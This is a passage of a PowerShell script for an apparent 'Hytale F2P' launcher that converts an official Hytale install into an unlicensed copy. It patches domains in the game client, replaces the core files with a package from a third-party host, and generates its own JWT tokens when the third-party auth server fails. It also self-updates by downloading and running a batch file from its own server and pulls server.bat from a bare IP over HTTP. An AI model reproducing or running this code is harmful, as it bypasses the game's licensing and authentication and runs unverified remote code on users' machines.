                $highestFound = $batchRange[$j]
                $foundInBatch = $true
                break
            }
        }

        if (-not $foundInBatch) {
            $probing = $false # Stop when a whole batch is empty
        } else {
            $currentStart += $batchSize # Continue to next batch
        }
    }

    $client.Dispose()
    $highestFound | Out-File $cacheFile
    Write-Host "      [FOUND] Highest discovered version: $highestFound.pwr" -ForegroundColor Green
    return $highestFound
}

function Find-OfficialPatch($version=4) {
    $targetName = "$version.pwr"
    $officialBase = Join-Path $env:APPDATA "Hytale"
    $patchTarget = Join-Path $officialBase "Games\Hytale\Patches\$targetName"
    if (Test-Path $patchTarget) { return $patchTarget }
    
    # Check current directory
    $localPatch = Join-Path $pwd $targetName
    if (Test-Path $localPatch) { return $localPatch }

    $alt = "C:\Program Files\Hytale\Patches\$targetName"
    if (Test-Path $alt) { return $alt }

    # Check local Launcher Cache
    $cachePatch = Join-Path $localAppData "cache\$targetName"
    if (Test-Path $cachePatch) { return $cachePatch }
    
    # [SMART-SCAN] If specific version not found, look for ANY .pwr and offer the largest
    $anyPatch = Get-ChildItem -Path $officialBase -Filter "*.pwr" -Recurse -ErrorAction SilentlyContinue | Sort-Object Length -Descending | Select-Object -First 1
    if ($anyPatch) { return $anyPatch.FullName }

    return $null
}

function Expand-WithProgress($zipPath, $destPath) {
    if (-not (Test-Path $zipPath)) { return $false }
    try {
        $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
        $total = $zip.Entries.Count
        $current = 0; $lastUpdate = 0; $skipCount = 0
        
        foreach ($entry in $zip.Entries) {
            $current++
            try {
                # Normalize path for Windows
                $normName = $entry.FullName.Replace("/", "\")
                $target = [System.IO.Path]::Combine($destPath, $normName)
                
                if ($entry.FullName.EndsWith("/")) {
                    if (-not (Test-Path $target)) { New-Item -ItemType Directory $target -Force | Out-Null }
                } else {
                    $parent = Split-Path $target
                    if (-not (Test-Path $parent)) { New-Item -ItemType Directory $parent -Force | Out-Null }
                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $target, $true)
                }
            } catch {
                $skipCount++
            }
            
            $percent = [math]::Floor(($current / $total) * 100)
            if ($percent -ge ($lastUpdate + 2) -or $current -eq $total) {
                $lastUpdate = $percent
                $bar = ("#" * [math]::Floor($percent/5)) + ("." * (20 - [math]::Floor($percent/5)))
                $skipMsg = if ($skipCount -gt 0) { " (Skipped: $skipCount)" } else { "" }
                Write-Host "`r      Extracting: [$bar] $percent% ($current / $total files)$skipMsg  " -NoNewline -ForegroundColor Yellow
            }
        }
        $zip.Dispose()
        Write-Host ""; return $true
    } catch {
        if ($zip) { $zip.Dispose() }
        return $false
    }
}

function Ensure-JRE($launcherRoot, $cacheDir) {
    $jreDir = Join-Path $launcherRoot "release\package\jre"
    $javaLatest = Join-Path $jreDir "latest"
    $javaPath = Join-Path $javaLatest "bin\java.exe"
    
    # 1. Check Custom/System Java if local is missing
    if (-not (Test-Path $javaPath)) {
        if ($global:javaPath -and (Test-Path $global:javaPath)) {
            Write-Host "      [OK] Using custom Java: $global:javaPath" -ForegroundColor Green
            return $true
        }
        $sysJava = Find-SystemJava
        if ($sysJava) {
            Write-Host "      [OK] Using system Java (JAVA_HOME/PATH): $sysJava" -ForegroundColor Green
            $global:javaPath = $sysJava; return $true
        }
    } else { return $true }

    Write-Host "`n[RECOVERY] Java Environment missing! Auto-repairing..." -ForegroundColor Yellow
    
    # 2. Fetch JRE Metadata from Hytale Official API
    $metadataUrl = "https://launcher.hytale.com/version/release/jre.json"
    $jreDownloadUrl = ""
    $jreSha256 = ""
    
    try {
        Write-Host "      [METADATA] Fetching JRE release info..." -ForegroundColor Cyan
        $json = Invoke-RestMethod -Uri $metadataUrl -Headers @{ "User-Agent" = "Mozilla/5.0" }
        # Navigate JSON: download_url -> windows -> amd64
        $release = $json.download_url.windows.amd64
        $jreDownloadUrl = $release.url
        $jreSha256 = $release.sha256
        
        if (-not $jreDownloadUrl) { throw "JRE URL not found in JSON" }
    } catch {
        Write-Host "      [ERROR] Failed to fetch JRE metadata from server." -ForegroundColor Red
        return $false
    }

    $fileName = [System.IO.Path]::GetFileName($jreDownloadUrl)
    $jreZip = Join-Path $cacheDir $fileName

    # 3. Download and Verify
    $needsDownload = $true
    if (Test-Path $jreZip) {
        try {
            # Check cached file integrity
            $calcHash = (Get-FileHash $jreZip -Algorithm SHA256).Hash.ToLower()
            if ($calcHash -eq $jreSha256.ToLower()) {
                $needsDownload = $false
                Write-Host "      [SKIP] JRE archive already valid in cache." -ForegroundColor Green
            } else {
                Write-Host "      [UPDATE] JRE cache mismatch. Redownloading..." -ForegroundColor Yellow
                Remove-Item $jreZip -Force
            }
        } catch { Remove-Item $jreZip -Force }
    }

    if ($needsDownload) {
        Write-Host "      [DOWNLOAD] Fetching JRE from official source..." -ForegroundColor Cyan
        # Note: Passing $false for useHeaders because this is an external S3/CDN link usually
        if (-not (Download-WithProgress $jreDownloadUrl $jreZip $false)) { 
            Write-Host "      [ERROR] JRE Download failed." -ForegroundColor Red
            return $false 
        }
        
        # Validate immediately after download
        Write-Host "      [VERIFY] Validating checksum..." -ForegroundColor Cyan
        $newHash = (Get-FileHash $jreZip -Algorithm SHA256).Hash.ToLower()
        if ($newHash -ne $jreSha256.ToLower()) {
            Write-Host "      [ERROR] Downloaded JRE hash mismatch!" -ForegroundColor Red
            Remove-Item $jreZip -Force
            return $false
        }
    }
    
    # 4. Extraction & Flattening
    Write-Host "      [EXTRACT] Installing Java Engine..." -ForegroundColor Cyan
    if (Expand-WithProgress $jreZip (Join-Path $jreDir "temp")) {
        if (Test-Path $javaLatest) { Remove-Item $javaLatest -Recurse -Force }
        Move-Item (Join-Path $jreDir "temp") $javaLatest -Force
        Flatten-JREDir $javaLatest
        
        if (Test-Path $javaPath) {
            Write-Host "      [SUCCESS] Java restored and optimized." -ForegroundColor Green
            return $true
        }
    }
    
    Write-Host "      [ERROR] Java restoration failed." -ForegroundColor Red
    if (Test-Path $jreZip) { Remove-Item $jreZip -Force }
    return $false
}

function Ensure-UserData($appDir, $cacheDir, $userDir) {
    if ($global:userDataVerified) { return $true }
    return $true
    
    $clientDir = Split-Path $userDir
    $localZip = Join-Path $clientDir "UserData.zip"
    $manifestFile = Join-Path $userDir "UserData_manifest.json"
    $savesDir = Join-Path $userDir "Saves"
    
    Write-Host "`n[SYNC] Checking UserData (UserData.zip)..." -ForegroundColor Cyan
    
    # 1. Fast-Path Check
    $needsSync = Test-FileNeedsDownload $localZip "UserData.zip"
    if (-not $needsSync -and (Test-Path $localZip) -and (Test-ZipValid $localZip) -and (Test-Path $manifestFile)) {
        try {
            $manifest = Get-Content $manifestFile -Raw | ConvertFrom-Json
            if ($manifest.zipHash -eq (Get-LocalSha1 $localZip)) {
                Write-Host "      [SKIP] UserData verified via manifest (Instant). Skipping extraction." -ForegroundColor Green
                $global:userDataVerified = $true; return $true
            }
        } catch {}
    }

    if ($needsSync) {
        Write-Host "      [DOWNLOAD] Fetching latest UserData..." -ForegroundColor Cyan
        if (-not (Download-WithProgress "$API_HOST/file/UserData.zip" $localZip)) { return $false }
    }
    
    # 2. Backup Detection (Saves)
    $backupPath = $null
    if (Test-Path $savesDir) {
        $worlds = Get-ChildItem -Path $savesDir -Directory
        if ($worlds.Count -gt 0) {
            Write-Host "`n      [DETECT] Existing world saves found in: $savesDir" -ForegroundColor Yellow
            $bChoice = Read-Host "      Do you want to backup your world data before updating game files? (y/n)"
            if ($bChoice -eq "y") {
                $backupPath = Join-Path $cacheDir "saves_backup_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
                New-Item -ItemType Directory $backupPath -Force | Out-Null
                Write-Host "      [BACKUP] Safely moving worlds to: $backupPath" -ForegroundColor Cyan
                Get-ChildItem -Path $savesDir | ForEach-Object { Move-Item $_.FullName $backupPath -Force }
            }
        }
    }

    # 3. Extract and Update Manifest
    Write-Host "      [EXTRACT] Applying UserData overwrites..." -ForegroundColor Cyan
    if (Expand-WithProgress $localZip $clientDir) {
        # Restore Backups
        if ($backupPath -and (Test-Path $backupPath)) {
            Write-Host "      [RESTORE] Putting your world data back..." -ForegroundColor Green
            if (-not (Test-Path $savesDir)) { New-Item -ItemType Directory $savesDir -Force | Out-Null }
            Get-ChildItem -Path $backupPath | ForEach-Object { Move-Item $_.FullName $savesDir -Force }
            Remove-Item $backupPath -Recurse -Force
        }

        try {
            $manifestObj = @{ zipHash = (Get-LocalSha1 $localZip); timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss") }
            $manifestObj | ConvertTo-Json | Out-File $manifestFile
        } catch {}
        
        Write-Host "      [SUCCESS] UserData patches applied." -ForegroundColor Green
        $global:userDataVerified = $true; return $true
    }
    return $false
}

function Show-LatestLogs($logDir, $lineCount=15, $filterErrors=$false) {
    if (-not (Test-Path $logDir)) { return }
    $latestLog = Get-ChildItem -Path $logDir -Filter "*.log" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if ($latestLog) {
        Write-Host "`n      [LOG TAIL] Last $lineCount lines from $($latestLog.Name):" -ForegroundColor White
        Write-Host "      ------------------------------------------" -ForegroundColor Gray
        $content = Get-Content $latestLog.FullName -Tail $lineCount
        if ($filterErrors) {
            $content | Where-Object { $_ -match "\|ERROR\||\|FATAL\|" } | ForEach-Object { Write-Host "      $_" -ForegroundColor Red }
        } else {
            $content | ForEach-Object { 
                $color = if ($_ -match "\|ERROR\||\|FATAL\|") { "Red" } else { "Gray" }
                Write-Host "      $_" -ForegroundColor $color 
            }
        }
        Write-Host "      ------------------------------------------" -ForegroundColor Gray
    }
}

function Invoke-OfficialUpdate($latestVer) {
    # Reset verification flags to force full check after update
    $global:assetsVerified = $false
    $global:depsVerified = $false
    
    $pwrName = "$latestVer.pwr"
    $pwrPath = Join-Path $localAppData "cache\$pwrName"

    # OFFICIAL DOWNLOAD LOGIC
    if (-not (Test-Path "$localAppData\butler\butler.exe")) {
        Write-Host "[SETUP] Downloading Butler..." -ForegroundColor Yellow
        $bZip = Join-Path $localAppData "butler.zip"
        if (-not ($null = Download-WithProgress "https://broth.itch.zone/butler/windows-amd64/LATEST/archive/default" $bZip $false)) {
            Write-Host "`n[ERROR] Failed to download Butler. Please check your connection." -ForegroundColor Red
            if (Test-Path $bZip) { Remove-Item $bZip -Force }
            return $false
        }

        if (Expand-WithProgress $bZip (Join-Path $localAppData "butler")) {
            Remove-Item $bZip -Force
        } else {
            Write-Host "`n[ERROR] Failed to extract Butler." -ForegroundColor Red
            if (Test-Path $bZip) { Remove-Item $bZip -Force }
            return $false
        }
    }
    
    if (-not (Assert-DiskSpace $pwrPath $REQ_ASSET_SPACE)) { return $false }
    if (-not (Test-Path (Split-Path $pwrPath))) { New-Item -ItemType Directory (Split-Path $pwrPath) -Force | Out-Null }
    
    # [PATCH DISCOVERY] Check for local official patch
    if (-not (Test-Path $pwrPath)) {
        $localPatch = Find-OfficialPatch $latestVer
        if ($localPatch) {
            Write-Host "`n      [FOUND] Existing Official Patch found:" -ForegroundColor Green
            Write-Host "      $localPatch" -ForegroundColor Gray
            $importChoice = Read-Host "      Import local file instead of downloading $(if ($localPatch -notmatch $pwrName) { '(Warning: Version mismatch)' })? (y/n)"
            if ($importChoice -eq "y") {
                if (Copy-WithProgress $localPatch $pwrPath) {
                    Write-Host "      [SUCCESS] Patch imported locally." -ForegroundColor Green
                }
            }
        }
    }

    # [PATCH INTEGRITY] Verify existing patch before applying
    if (Test-Path $pwrPath) {
        $stats = Get-Item $pwrPath
        $sizeMB = [math]::Round($stats.Length / 1MB, 2)
        if ($sizeMB -lt 1500) {
            Write-Host "      [WARN] Cached patch appears incomplete ($sizeMB MB < 1500 MB). Redownloading..." -ForegroundColor Yellow
            Remove-Item $pwrPath -Force
        }
    }

    # [DOWNLOAD] Perform actual download with success check
    if (-not (Test-Path $pwrPath)) {
        if (-not (Download-WithProgress "$OFFICIAL_BASE/windows/amd64/release/0/$pwrName" $pwrPath $false)) {
            Write-Host "      [ERROR] Official patch download failed." -ForegroundColor Red
            return $false
        }
    }
    
    # Prepare local staging
    $stagingDir = Join-Path $cacheDir "butler_temp"
    if (Test-Path $stagingDir) { Remove-Item $stagingDir -Recurse -Force | Out-Null }
    New-Item -ItemType Directory $stagingDir -Force | Out-Null

    Write-Host "      [APPLY] Applying official patch with Butler..." -ForegroundColor Cyan
    $butlerPath = Join-Path $localAppData "butler\butler.exe"
    
    # Run Butler directly in the host console for native progress/logging
    $p = Start-Process -FilePath $butlerPath -ArgumentList "apply", "--staging-dir", "`"$stagingDir`"", "--verbose", "`"$pwrPath`"", "`"$appDir`"" -NoNewWindow -Wait -PassThru
    
    if ($p.ExitCode -ne 0) {
        Write-Host "`n      [CRIT] Butler failed (Exit Code: $($p.ExitCode))" -ForegroundColor Red
        # If Butler failed, checking if it was a file corruption
        Write-Host "      [SAFETY] Patch might be corrupt. Deleting for redownload." -ForegroundColor Yellow
        Remove-Item $pwrPath -Force -ErrorAction SilentlyContinue
        Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
        pause; return $false
    }
    
    Write-Host "`n[APPLY] Official patch application finished." -ForegroundColor Green
    $global:pwrVersion = $latestVer
    $global:pwrHash = Get-LocalSha1 $gameExe
    Save-Config
    
    # IMMEDIATE POST-PATCH SYNC
    Write-Host "[SYNC] Converting Official Install to F2P Core..." -ForegroundColor Cyan
    if (-not (Ensure-UserData $appDir $cacheDir $userDir)) { return $false }

    Write-Host "`n[COMPLETE] Conversion finished. Hytale is ready." -ForegroundColor Green
    return $true
}

# --- Auto-Detect Logic ---

$adminBadge = if ($isAdmin) { " [ADMIN MODE]" } else { "" }

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "       HYTALE F2P - AUTO-PATCHER$adminBadge" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

# 1. Load Player Info
$global:pName = "Player"; $global:pUuid = [guid]::NewGuid().ToString()
$global:autoUpdate = $false; $global:pwrVersion = 0; $global:javaPath = ""

# -- NEW LOGIC: Use Public Documents storage (No Admin, Patch Proof) --
$storedPlayerId = Get-OrCreate-PlayerId $localAppData
if ($storedPlayerId) { $global:pUuid = $storedPlayerId }

$cfgFile = Join-Path $PublicConfig "config_data.json"

if (Test-Path $cfgFile) {
    try {
        $json = Get-Content $cfgFile -Raw | ConvertFrom-Json
        if ($null -ne $json.username) { $global:pName = $json.username }
        if ($null -ne $json.authUrl) { $global:AUTH_URL_CURRENT = $json.authUrl }
        if ($null -ne $json.autoUpdate) { $global:autoUpdate = $json.autoUpdate }
        if ($null -ne $json.pwrVersion) { $global:pwrVersion = $json.pwrVersion }
        if ($null -ne $json.pwrHash) { $global:pwrHash = $json.pwrHash }
    } catch {}
}
Write-Host "      Profile: $global:pName" -ForegroundColor Cyan
Write-Host "      UUID:    $global:pUuid" -ForegroundColor Gray









# --- Launcher Self-Update ---
$remoteLauncherHash = Get-RemoteHash "game launcher.bat"
if ($remoteLauncherHash) {
    # $f is passed from the CMD bootstrap as the full path to this file
    $localLauncherHash = Get-LocalSha1 $f
    if ($localLauncherHash -ne $remoteLauncherHash) {
        Write-Host "`n[UPDATE] A new version of the launcher is available!" -ForegroundColor Yellow
        $tempLauncher = "$f.new"
        if (Download-WithProgress "$API_HOST/file/game%20launcher.bat" $tempLauncher $false) {
            Write-Host "      [SUCCESS] Update downloaded. Restarting launcher..." -ForegroundColor Green
            Start-Sleep -Seconds 1
            # Overwrite and restart using CMD to avoid locks. We use long paths with quotes to prevent 8.3 naming (GAMELA~2.BAT).
            $cmd = "timeout /t 1 >nul & move /y `"$tempLauncher`" `"$f`" & cmd /c `"$f`""
            Start-Process cmd.exe -ArgumentList "/c $cmd" -WindowStyle Normal
            exit
        }
    }
}








$forceShowMenu = $false
# Detect and kill existing instances
$procName = "HytaleClient"
if (Get-Process $procName -ErrorAction SilentlyContinue) {
    Write-Host "      [INFO] Hytale is already running. Closing for rerun..." -ForegroundColor Yellow
    try {
        taskkill /F /IM "${procName}.exe" /T 2>$null | Out-Null
        # Also clean up Java if it's stuck
        taskkill /F /IM "java.exe" /T 2>$null | Out-Null
        Start-Sleep -Seconds 2 
    } catch {}
}

while ($true) {
    # REFRESH DYNAMIC PATHS based on current $gameExe
    $launcherRoot = try { Split-Path (Split-Path (Split-Path (Split-Path (Split-Path (Split-Path $gameExe))))) } catch { $localAppData }
    $appDir = Join-Path $launcherRoot "release\package\game\latest"
    $javaExe = Join-Path $launcherRoot "release\package\jre\latest\bin\java.exe"
    
    # -- NEW LOGIC: Advanced UserDir Resolution --
    $userDir = Find-UserDataPath $appDir
    Ensure-ModDirs $userDir
    # --------------------------------------------
    
    # Ensure local directory health
    @($appDir, $userDir) | ForEach-Object { if (-not (Test-Path $_)) { New-Item -ItemType Directory $_ -Force | Out-Null } }

    # 2. Check F2P Hash
    Write-Host "`n[1/2] Identifying game version..." -ForegroundColor Gray
    $f2pMatch = $false
    $serverOnline = $false
    
    # Session Cache for Speed
    if ($global:lastVerifiedHash -and $global:lastVerifiedTime -gt (Get-Date).AddMinutes(-5)) {
        $localHash = $global:lastVerifiedHash
        Write-Host "      [CACHE] Using session-verified hash (Instant)." -ForegroundColor Green
    } else {
        $localHash = Get-LocalSha1 $gameExe
    }

try {
    $rData = Invoke-RestMethod -Uri "$API_HOST/api/hash/HytaleClient.exe" -Headers $global:HEADERS -Method Get -TimeoutSec 3
    $serverOnline = $true
    
    Write-Host "      Local:  $localHash" -ForegroundColor Gray
    Write-Host "      Server: $($rData.hash)" -ForegroundColor Gray

    if ($localHash -eq $rData.hash) {
        $f2pMatch = $true
        $global:lastVerifiedHash = $localHash
        $global:lastVerifiedTime = Get-Date
        Write-Host "[OK] F2P Smart-Patch detected and verified." -ForegroundColor Green
    } else {
        Write-Host "[INFO] Official PWR version detected (Hash mismatch)." -ForegroundColor Cyan
    }
} catch {
    Write-Host "[WARN] Update server unreachable." -ForegroundColor Yellow
}

# 3. Decision Tree
if ((Test-Path $gameExe) -and -not $forceShowMenu) {
    # AUTO-LAUNCH (Both F2P and PWR)
    if ($f2pMatch) {
        Write-Host "[2/2] Auto-Launching Hytale F2P..." -ForegroundColor Cyan
    } else {
        $latestVer = Get-LatestPatchVersion
        
        # 1. Smart Applied Check (Hash or Version based)
        $isApplied = ($localHash -eq $global:pwrHash) -or ($global:pwrVersion -ge $latestVer)
        
        # Diagnostic Debugging
        if ($env:IS_SHORTCUT -eq "true") {
            Write-Host "      [DEBUG] Local:  $localHash" -ForegroundColor Gray
            Write-Host "      [DEBUG] Target: $global:pwrHash" -ForegroundColor Gray
            Write-Host "      [DEBUG] Ver:    $global:pwrVersion (Latest: $latestVer)" -ForegroundColor Gray
        }
        
        if ($isApplied) {
            Write-Host "[INFO] Local version is up-to-date (Version: $latestVer)." -ForegroundColor Green
            # Ensure hash is synced if version matched
            if ($localHash -ne $global:pwrHash) { $global:pwrHash = $localHash; Save-Config }
        } else {
            Write-Host "[INFO] Official PWR version detected. Checking for updates..." -ForegroundColor Magenta
            $patchPath = Find-OfficialPatch $latestVer
            $hasValidPatch = $false
            if ($patchPath -and (Test-Path $patchPath)) {
                # Basic size check for integrity (patches are usually > 100MB)
                if ((Get-Item $patchPath).Length -gt 10MB) { $hasValidPatch = $true }
            }

            if ($global:autoUpdate) {
                Write-Host "      [AUTO] New version $latestVer detected. Updating now..." -ForegroundColor Cyan
                if (Invoke-OfficialUpdate $latestVer) { continue }
            } else {
                Write-Host "`n[UPDATE] A new Official Version ($latestVer) is available!" -ForegroundColor Yellow
                $uChoice = Read-Host "          Do you want to update the game? (y/n) [y]"
                if ($uChoice -eq "n") {
                    Write-Host "      [SKIP] Proceeding with current version." -ForegroundColor Gray
                    $global:pwrVersion = $latestVer; $global:pwrHash = $localHash; Save-Config
                } else {
                    $autoU = Read-Host "          Do you want to auto-update games when you launch the game? (y/n)"
                    if ($autoU -eq "y") { $global:autoUpdate = $true; Save-Config }
                    
                    if (Invoke-OfficialUpdate $latestVer) { 
                        Write-Host "      [INFO] Update applied successfully." -ForegroundColor Green
                        continue 
                    }
                }
            }
        }
        Write-Host "[2/2] Launching Official PWR version..." -ForegroundColor Magenta
    }
    
    # Always verify assets and deps after any repair
    if (-not (Ensure-UserData $appDir $cacheDir $userDir)) { pause; continue }
    if (-not (Ensure-JRE $launcherRoot $cacheDir)) { pause; continue }
    
} else {
    # SHOW MENU ONLY IF MISSING OR RECOVERY NEEDED
    if (-not (Test-Path $gameExe)) {
        Write-Host "[!] Hytale is not installed or files are missing." -ForegroundColor Red
    } elseif (-not $f2pMatch) {
         Write-Host "[!] Local version does not match F2P server." -ForegroundColor Yellow
    }
    
    if ($forceShowMenu) {
        Write-Host "`n[RECOVERY] You have missing or corrupt files. Please re-download." -ForegroundColor Red
        Write-Host "            (Option [2] is highly recommended based on server hash)" -ForegroundColor Cyan
    }

    $opt2Text = if ($global:javaMissingFlag) { "[2] FIX MISSING JAVA / Update Smart-Patch" } else { "[2] Download/Update to Hytale F2P (Smart-Patch)" }
    $opt2Color = if ($global:javaMissingFlag) { "Yellow" } else { "White" }
    Write-Host "`nAvailable Actions:" -ForegroundColor White
    Write-Host " [1] Download Official Hytale Patches (PWR)" -ForegroundColor White
    Write-Host " $opt2Text" -ForegroundColor $opt2Color
    Write-Host " [3] Attempt Force Launch anyway" -ForegroundColor Gray
    $choice = Read-Host "`n Select an option [1]"
    if ($choice -eq "") { $choice = "1" }

    if ($choice -eq "1") {
        # Discover latest version
        $latestVer = Get-LatestPatchVersion
        if (Invoke-OfficialUpdate $latestVer) { pause }
        continue
    } 
    elseif ($choice -eq "2") {
        # Reset verification flags to force full check after repair
        $global:assetsVerified = $false
        $global:depsVerified = $false

        # F2P DOWNLOAD LOGIC WITH PERSISTENT CACHE
        # Use the f2pMatch result from earlier
        $coreNeedsRepair = -not $f2pMatch
        $javaMissing = -not (Test-Path (Join-Path $launcherRoot "release\package\jre\latest\bin\java.exe"))
        
        if ($coreNeedsRepair) {
            Write-Host "`n[ACTION] Repairing/Updating F2P Core..." -ForegroundColor Magenta
            if ($f2pMatch -eq $false -and (Test-Path $gameExe)) {
                Write-Host "      [INFO] Replacing Official PWR version with F2P Core..." -ForegroundColor Cyan
            }
            
            # Check disk space (Zip + Extraction room)
            if (-not (Assert-DiskSpace $appDir ($REQ_CORE_SPACE * 2))) { pause; continue }
            
            $localZip = Join-Path $cacheDir $ZIP_FILENAME
            $needsDownload = Test-FileNeedsDownload $localZip $ZIP_FILENAME
            
            if ($needsDownload) {
                Write-Host "      [DOWNLOAD] Fetching $ZIP_FILENAME..." -ForegroundColor Cyan
                if (-not (Download-WithProgress "$API_HOST/file/$ZIP_FILENAME" $localZip)) {
                    Write-Host "      [ERROR] Download failed. Check your connection." -ForegroundColor Red
                    pause; continue
                }
            }
            
            Write-Host "      [EXTRACT] Installing core files..." -ForegroundColor Cyan
            if (Expand-WithProgress $localZip $appDir) {
                Write-Host "      [SUCCESS] Core package verified and installed." -ForegroundColor Green
            } else {
                Write-Host "      [ERROR] Extraction failed. The zip might be corrupt or files are in use." -ForegroundColor Red
                if ($localZip) { Remove-Item $localZip -Force }
                pause; continue
            }
        } elseif ($javaMissing) {
            Write-Host "`n[ACTION] Targeted Java Repair..." -ForegroundColor Magenta
            if (-not (Ensure-JRE $launcherRoot $cacheDir)) { pause; continue }
        } else {
            Write-Host "`n[INFO] Core and Engine look healthy. Refreshing assets..." -ForegroundColor Cyan
        }
        
        # Always verify assets and deps after any repair
        if (-not (Ensure-UserData $appDir $cacheDir $userDir)) { pause; continue }

        $global:javaMissingFlag = $false
        Write-Host "`n[COMPLETE] Hytale F2P is now ready!" -ForegroundColor Green
    }
    elseif ($choice -ne "3") { exit }
}

# --- LAUNCH SEQUENCE ---

# Final Readiness Guard: Verify all critical files exist right before launch
if (-not (Test-Path $gameExe)) {
    Write-Host "`n[ERROR] Game Executable (HytaleClient.exe) is missing!" -ForegroundColor Red
    Write-Host "        Redirecting to Repair menu..." -ForegroundColor Cyan
    $forceShowMenu = $true; continue
}

if (-not (Ensure-JRE $launcherRoot $cacheDir)) {
    Write-Host "`n[ERROR] Java Runtime could not be recovered." -ForegroundColor Red
    $forceShowMenu = $true; $global:javaMissingFlag = $true; continue
}

# --- APPLY DOMAIN PATCHING ---
Patch-HytaleClient $gameExe | Out-Null
# -----------------------------

# --- HELPER: Create Desktop Shortcut ---
function Create-Shortcut($targetBat, $iconPath) {
    try {
        $shortcutPath = "$env:USERPROFILE\Desktop\Hytale F2P.lnk"
        if (-not (Test-Path $shortcutPath)) {
            Write-Host "      [SETUP] Creating Desktop Shortcut..." -ForegroundColor Yellow
            $wShell = New-Object -ComObject WScript.Shell
            $shortcut = $wShell.CreateShortcut($shortcutPath)
            $shortcut.TargetPath = $targetBat
            $shortcut.Arguments = "am_shortcut" # This flag tells the script to skip the menu next time
            $shortcut.IconLocation = $iconPath
            $shortcut.WindowStyle = 1
            $shortcut.Save()
            Write-Host "      [SUCCESS] Shortcut created on Desktop." -ForegroundColor Green
        }
    } catch {
        Write-Host "      [WARN] Could not create shortcut: $($_.Exception.Message)" -ForegroundColor DarkGray
    }
}

# --- MAIN LOGIC ---

$adminBadge = if ($isAdmin) { " [ADMIN MODE]" } else { "" }

# 1. Load Player Info
$global:pName = "Player"; $global:pUuid = [guid]::NewGuid().ToString()
$storedPlayerId = Get-OrCreate-PlayerId $localAppData
if ($storedPlayerId) { $global:pUuid = $storedPlayerId }

$cfgFile = Join-Path $PublicConfig "config_data.json"
if (Test-Path $cfgFile) {
    try {
        $json = Get-Content $cfgFile -Raw | ConvertFrom-Json
        if ($null -ne $json.username) { $global:pName = $json.username }
        if ($null -ne $json.authUrl) { $global:AUTH_URL_CURRENT = $json.authUrl }
        if ($null -ne $json.autoUpdate) { $global:autoUpdate = $json.autoUpdate }
        if ($null -ne $json.pwrVersion) { $global:pwrVersion = $json.pwrVersion }
        if ($null -ne $json.pwrHash) { $global:pwrHash = $json.pwrHash }
    } catch {}
}

# Define appDir early
$launcherRoot = try { Split-Path (Split-Path (Split-Path (Split-Path (Split-Path (Split-Path $gameExe))))) } catch { $localAppData }
$appDir = Join-Path $launcherRoot "release\package\game\latest"
$userDir = Find-UserDataPath $appDir
# --- SMART PROFILE RECOGNITION (Auto-Sync Save Data) ---
$savesDir = Join-Path $userDir "Saves"
if (Test-Path $savesDir) {
    $playerFiles = Get-ChildItem -Path $savesDir -Filter "*.json" -Recurse | Where-Object { $_.FullName -match "\\universe\\players\\" }
    if ($playerFiles.Count -ge 1) {
        try {
            # Sort by newest if there are multiple worlds
            $targetProfile = $playerFiles | Sort-Object LastWriteTime -Descending | Select-Object -First 1
            $saveData = Get-Content $targetProfile.FullName -Raw | ConvertFrom-Json
            
            $foundName = $saveData.Components.Nameplate.Text
            if (-not $foundName) { $foundName = $saveData.Components.DisplayName.DisplayName.RawText }
            $foundUuid = $targetProfile.BaseName
            
            if ($foundName -and $foundUuid -and ($global:pName -ne $foundName -or $global:pUuid -ne $foundUuid)) {
                Write-Host "`n      [DETECT] Character Detected: $foundName ($foundUuid)" -ForegroundColor Cyan
                $global:pName = $foundName
                $global:pUuid = $foundUuid
                
                # Sync back to persistence trackers
                Save-Config
                
                $idFile = Join-Path $PublicConfig "player_id.json"
                $idPayload = @{ playerId = $foundUuid; createdAt = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffZ") }
                $idPayload | ConvertTo-Json | Out-File $idFile -Encoding UTF8
            }
        } catch {}
    }
}
# ------------------------------------------------------

Write-Host "`n[3/4] Authenticating..." -ForegroundColor Cyan
Write-Host "      Endpoint: $global:AUTH_URL_CURRENT" -ForegroundColor Gray
$authUrl = "$global:AUTH_URL_CURRENT/game-session/child" 
$body = @{ uuid=$global:pUuid; name=$global:pName; scopes=@("hytale:server", "hytale:client") } | ConvertTo-Json
try {
    $res = Invoke-RestMethod -Uri $authUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 5
    $idToken = $res.identityToken; $ssToken = $res.sessionToken
    Write-Host "      [SUCCESS] Token Acquired." -ForegroundColor Green
    Save-Config # Persist successful auth endpoint
} catch {
    $issuer = if ($global:AUTH_URL_CURRENT) { $global:AUTH_URL_CURRENT } else { "https://sessions.sanasol.ws" }
    $idToken = New-HytaleJWT $global:pUuid $global:pName $issuer
    $ssToken = $idToken
    Write-Host "      [OFFLINE] Guest mode (Generated Corrected JWT)." -ForegroundColor Yellow
    Write-Host "      [DEBUG] Reason: $($_.Exception.Message)" -ForegroundColor Gray
}

# 2. Main Menu Loop (Skipped if Shortcut)
$isShortcut = ($env:IS_SHORTCUT -eq "true")
$proceedToLaunch = $false

while (-not $proceedToLaunch) {
    
    if ($isShortcut) {
        Write-Host "      [AUTO] Running via Shortcut. Skipping Menu..." -ForegroundColor Green
        $proceedToLaunch = $true
        break
    }

    Clear-Host
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "       HYTALE F2P - LAUNCHER MENU" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host " [1] Start Hytale F2P (Create Shortcut)" -ForegroundColor Green
    Write-Host " [2] Setup Host Server (Download server.bat)" -ForegroundColor Yellow
    Write-Host " [3] Repair / Force Update" -ForegroundColor Red
    Write-Host " [4] Install HyFixes (Server Crash Fixes)" -ForegroundColor Cyan
    Write-Host ""
    
    $menuChoice = Read-Host " Select an option [1]"
    if ($menuChoice -eq "") { $menuChoice = "1" }

    switch ($menuChoice) {
        "1" {
            Create-Shortcut $f $gameExe 
            $proceedToLaunch = $true
        }
        "2" {
            # --- SERVER SETUP LOGIC (Fixed) ---
            $serverBatUrl = "http://72.62.192.173:5000/file/server.bat"
            $serverBatDest = Join-Path $appDir "server.bat"
